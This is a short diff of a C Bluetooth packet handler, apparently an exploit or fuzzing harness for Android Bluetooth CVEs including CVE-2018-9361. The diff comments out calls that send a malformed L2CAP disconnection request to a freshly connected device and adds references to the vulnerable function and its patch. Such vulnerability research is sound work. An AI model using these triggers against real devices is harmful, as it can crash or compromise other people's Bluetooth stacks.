@@ -199,13 +199,17 @@ static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packe
         handle = hci_event_connection_complete_get_connection_handle(packet);
         printf("Connection complete (handle: %d)\n", handle);
         // CVE-2018-9361
-        //l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
+        // l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
         //    l2cap_next_sig_id());
     case HCI_EVENT_LE_META:
-        // BLE CVE ID
         handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
-        l2cap_send_le_signaling_packet(handle, DISCONNECTION_REQUEST_FUZZ,
-                                       l2cap_next_sig_id(), 0xde, 0xfe);
+
+        // BLE CVE ID (similar to CVE-2018-9361)
+        // l2cap_send_le_signaling_packet(handle, DISCONNECTION_REQUEST_FUZZ,
+        //                                l2cap_next_sig_id(), 0xde, 0xfe);
+
+        // l2c_lcc_proc_pdu
+        // https://android.googlesource.com/platform/system/bt/+/488aa8befd5bdffed6cfca7a399d2266ffd201fb%5E%21/#F0
     default:
         printf("packet_handler: 0x%x\n", event);
         break;
